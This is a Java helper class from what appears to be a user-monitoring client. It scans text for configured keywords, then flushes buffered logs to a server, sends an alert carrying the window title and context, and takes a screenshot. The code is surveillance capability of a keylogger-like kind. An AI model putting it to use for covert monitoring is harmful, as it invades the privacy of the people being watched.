package client;

import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static client.Main.ALERT_COOLDOWN_MS;
import static client.Main.KEYWORD_PATTERNS;
import static client.Main.getTimestamp;
import static client.Main.lastAlertTime;

public class Helpers extends Main {
    
      // ---------------- Helpers ----------------

    public static String getMatchedKeyword(String text) {
    if (text == null || text.isEmpty()) return null;
    for (Map.Entry<String, Pattern> e : KEYWORD_PATTERNS.entrySet()) {
        Matcher m = e.getValue().matcher(text);
        if (m.find()) {
            return e.getKey(); // return the canonical keyword (from KEYWORDS)
        }
    }
    return null;    
    }

    protected static void onKeywordDetected(String keyword, String windowTitle, String context) {
    if (keyword == null) return;
    long now = System.currentTimeMillis();
    Long last = lastAlertTime.get(keyword);
    if (last != null && (now - last) < ALERT_COOLDOWN_MS) {
    // recent alert already sent for this keyword — skip
    return;
    }
    
    lastAlertTime.put(keyword, now);

    // 1) flush buffered logs so server sees preceding activity
    try { 
       
        BufferHelpers.flushBuffer(); 
    
    } catch (Throwable ignored) {

    }

    // 2) send an immediate ALERT log (high-priority)
    String contextSnippet = (context == null) ? "" : (" Context: \"" + context + "\"");
    String alertLine = YELLOW+BOLD+getTimestamp() +RED+ " | "+YELLOW+"["+RED+"ALERT"+YELLOW+"] "+YELLOW+"Keyword: \"" +RED+ keyword +YELLOW+ "\" detected "+RED+"| "+GREEN+"Window: " +YELLOW+ (windowTitle == null ? "" : windowTitle) + contextSnippet;
    BufferHelpers.sendLogImmediate(alertLine);

    // 3) take & send a screenshot immediately for context
    ScreenShot.triggerScreenshot("keyword_alert:" + keyword, windowTitle);
    }

}
